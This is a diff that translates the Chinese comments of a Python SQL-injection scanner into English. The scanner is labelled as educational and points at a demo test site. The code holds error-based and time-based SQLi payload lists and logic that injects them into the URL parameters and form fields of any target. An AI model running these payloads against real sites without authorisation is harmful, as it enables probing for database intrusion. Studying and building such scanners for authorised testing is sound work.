@@ -9,35 +9,35 @@ from typing import Dict, List, Tuple
 import requests
 from bs4 import BeautifulSoup
 
-# 对称加密库（用于保护敏感输出/凭据）
+# Symmetric encryption library (used to protect sensitive output/credentials)
 from cryptography.fernet import Fernet
 
 # test website: http://testfire.net/login.jsp
 # ---------------------------
-# 配置：payload 列表与检测规则
+# Configuration: payload lists and detection rules
 # ---------------------------
-# 常见错误型 SQLi payloads（短小示例）
+# Common error-based SQLi payloads (short examples)
 ERROR_BASED_PAYLOADS = [
     "'",
-    "\"",
+    '"',
     "' OR '1'='1",
-    "\" OR \"1\"=\"1",
+    '" OR "1"="1',
     "' OR '1'='1' -- ",
     "') OR ('1'='1",
     "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ",
-    "\" and extractvalue(1,concat(0x7e,(select database()),0x7e)) -- ",
+    '" and extractvalue(1,concat(0x7e,(select database()),0x7e)) -- ',
 ]
 
-# 常见 time-based payloads：会在数据库端引起延迟（取决于 DBMS）
-# 注意：实际有效性与目标数据库类型相关（MySQL, PostgreSQL, MSSQL, SQLite 等差异很大）
+# Common time-based payloads: may cause delay on the DB side (depends on DBMS)
+# Note: actual effectiveness depends on target DB type (MySQL, PostgreSQL, MSSQL, SQLite differ a lot)
 TIME_BASED_PAYLOADS = [
     "'; SELECT pg_sleep(5); --",               # PostgreSQL
     "'; WAITFOR DELAY '0:0:5'; --",            # MSSQL
     "' OR SLEEP(5) OR '1'='1",                 # MySQL
-    "\" OR SLEEP(5) OR \"1\"=\"1",             # MySQL 双引号版本
+    '" OR SLEEP(5) OR "1"="1',             # MySQL double-quote version
 ]
 
-# 常见 SQL 错误指纹，用于错误型检测（不穷尽）
+# Common SQL error fingerprints for error-based detection (not exhaustive)
 SQL_ERROR_SIGS = [
     "you have an error in your sql syntax",     # MySQL
     "warning: mysql",                            # MySQL
@@ -50,18 +50,18 @@ SQL_ERROR_SIGS = [
     "odbc",                                       # ODBC drivers
 ]
 
-# 请求默认超时（s）
+# Default request timeout (seconds)
 DEFAULT_TIMEOUT = 12
 
 
 # ---------------------------
-# 帮助函数
+# Helper functions
 # ---------------------------
 def generate_fernet_key() -> bytes:
     """
-    生成一个新的 Fernet 密钥（仅示例）。
-    在生产中，你应该把密钥安全地存放（例如使用密钥管理服务 KMS）。
-    返回：字节类型的密钥
+    Generate a new Fernet key (example only).
+    In production, you should store the key securely (e.g., using a Key Management Service).
+    Returns: key as bytes
     """
     return Fernet.generate_key()
 
@@ -78,8 +78,8 @@ def decrypt_bytes(key: bytes, token: bytes) -> bytes:
 
 def is_error_in_text(text: str) -> Tuple[bool, str]:
     """
-    在响应正文中查找是否含有已知 SQL 错误指纹
-    返回 (found, matched_signature)
+    Search the response body for known SQL error fingerprints
+    Returns (found, matched_signature)
     """
     lower = text.lower()
     for sig in SQL_ERROR_SIGS:
@@ -90,7 +90,7 @@ def is_error_in_text(text: str) -> Tuple[bool, str]:
 
 def parse_query_params(url: str) -> Dict[str, List[str]]:
     """
-    解析 URL 的查询参数，返回 dict param -> [values]
+    Parse URL query parameters, return dict param -> [values]
     """
     parsed = urllib.parse.urlparse(url)
     return urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
@@ -98,7 +98,7 @@ def parse_query_params(url: str) -> Dict[str, List[str]]:
 
 def build_url_with_params(base_url: str, params: Dict[str, List[str]]) -> str:
     """
-    使用给定 params 构造 URL（替换查询部分）
+    Build a URL using the given params (replace the query part)
     """
     parsed = urllib.parse.urlparse(base_url)
     new_query = urllib.parse.urlencode(
@@ -112,12 +112,12 @@ def build_url_with_params(base_url: str, params: Dict[str, List[str]]) -> str:
 
 
 # ---------------------------
-# 扫描逻辑
+# Scanning logic
 # ---------------------------
 class ScannerResult:
     def __init__(self, target_url: str):
         self.target_url = target_url
-        self.issues = []  # 列表，存储发现的issue字典
+        self.issues = []  # list storing discovered issue dictionaries
 
     def add_issue(self, param: str, payload: str, evidence: str, kind: str):
         self.issues.append({
@@ -145,7 +145,7 @@ class WebScanner:
 
     def test_url_params_for_sqli(self):
         """
-        如果 URL 带有查询参数，针对每个参数逐个注入尝试（GET）
+        If the URL contains query parameters, attempt injection for each parameter (GET)
         """
         params = parse_query_params(self.base_url)
         if not params:
@@ -156,7 +156,7 @@ class WebScanner:
         for p in params.keys():
             original_value = params[p][0] if params[p] else ""
             for payload in ERROR_BASED_PAYLOADS:
-                # 构造注入后的参数副本
+                # construct a copy of parameters with injection
                 crafted = {k: v[:] for k, v in params.items()}  # shallow copy lists
                 crafted[p] = [original_value + payload]
                 test_url = build_url_with_params(self.base_url, crafted)
@@ -180,13 +180,13 @@ class WebScanner:
                     resp = self.session.get(test_url, timeout=self.timeout + 10, allow_redirects=True)
                     t1 = time.time()
                     elapsed = t1 - t0
-                    # 若响应时间显著高于阈值（比如 >4s），怀疑 time-based 注入成立
+                    # If response time significantly exceeds threshold (e.g., >4s), suspect time-based injection
                     if elapsed >= 4.0:
                         evidence = f"Response delay {elapsed:.2f}s for payload {payload}"
                         print(f"[!] Possible time-based SQLi on param '{p}' with payload '{payload}'. Delay: {elapsed:.2f}s")
                         self.result.add_issue(p, payload, evidence, "time-based")
                 except requests.Timeout:
-                    # 超时也可能是 time-based 注入导致（或网络问题），标为可疑
+                    # Timeout may also indicate time-based injection (or network issues), mark as suspicious
                     evidence = "Request timed out (possible time-based injection or network issue)"
                     print(f"[!] Timeout when testing time-based payload on param '{p}' (payload='{payload}').")
                     self.result.add_issue(p, payload, evidence, "time-based/timeout")
@@ -195,8 +195,8 @@ class WebScanner:
 
     def find_and_test_forms(self):
         """
-        抓取页面，解析表单，并对表单的每个可输入字段进行错误型与 time-based 测试。
-        注意：此处提交表单时保持其他字段为空（或原始），仅演示原理。
+        Fetch the page, parse forms, and run error-based and time-based tests for each input field.
+        Note: when submitting forms here we keep other fields empty (or default), this is for demonstration only.
         """
         try:
             resp = self.session.get(self.base_url, timeout=self.timeout)
@@ -222,7 +222,7 @@ class WebScanner:
                 name = inp.get("name")
                 if not name:
                     continue
-                # 忽略 file 等类型
+                # ignore file types etc.
                 itype = (inp.get("type") or "").lower()
                 if itype == "submit" or itype == "button" or itype == "file":
                     continue
@@ -230,7 +230,7 @@ class WebScanner:
 
             print(f"[*] Testing form #{i} (method={method}, action={form_url}), fields={list(fields.keys())}")
 
-            # 对每个字段进行注入尝试（错误型 + time-based）
+            # For each field attempt injection (error-based + time-based)
             for field in list(fields.keys()):
                 orig_value = fields[field]
                 for payload in ERROR_BASED_PAYLOADS:
@@ -273,7 +273,7 @@ class WebScanner:
 
     def run_all_tests(self, find_forms: bool = True):
         """
-        运行所有测试：先尝试 URL 参数注入，再尝试页面表单（如果启用）。
+        Run all tests: try URL parameter injection first, then page forms (if enabled).
         """
         print("[*] Starting tests on:", self.base_url)
         self.test_url_params_for_sqli()
@@ -283,18 +283,18 @@ class WebScanner:
 
 
 # ---------------------------
-# 主函数与 CLI
+# Main function and CLI
 # ---------------------------
 def main():
     parser = argparse.ArgumentParser(description="Simple Web Vulnerability Scanner (education only)")
-    parser.add_argument("--url", required=True, help="Target URL (可包含查询参数)")
+    parser.add_argument("--url", required=True, help="Target URL (may include query parameters)")
     parser.add_argument("--find-forms", action="store_true", help="Parse page and test forms")
     parser.add_argument("--output", default="scan_results.enc", help="Encrypted output file for results")
     parser.add_argument("--key-out", default="fernet.key", help="Where to save generated Fernet key (keep safe)")
     parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout seconds")
     args = parser.parse_args()
 
-    # 生成或加载对称密钥（这里直接生成并保存到文件，注意权限）
+    # Generate or load symmetric key (here we generate and save to file, watch permissions)
     key = generate_fernet_key()
     with open(args.key_out, "wb") as f:
         f.write(key)
@@ -302,10 +302,10 @@ def main():
 
     scanner = WebScanner(args.url, timeout=args.timeout)
 
-    # 运行测试
+    # Run tests
     scanner.run_all_tests(find_forms=args.find_forms)
 
-    # 序列化结果并加密保存
+    # Serialize results and encrypt save
     json_bytes = scanner.result.to_json().encode("utf-8")
     enc = encrypt_bytes(key, json_bytes)
     with open(args.output, "wb") as f:
@@ -314,7 +314,7 @@ def main():
         f.write(decrypt_bytes(key, enc))
     print(f"[*] Encrypted scan results saved to {args.output}")
 
-    # 如果没有发现任何 issue，可输出提示
+    # If no issues found, output a notice
     if not scanner.result.issues:
         print("[*] No obvious issues detected by this basic scanner.")
     else:
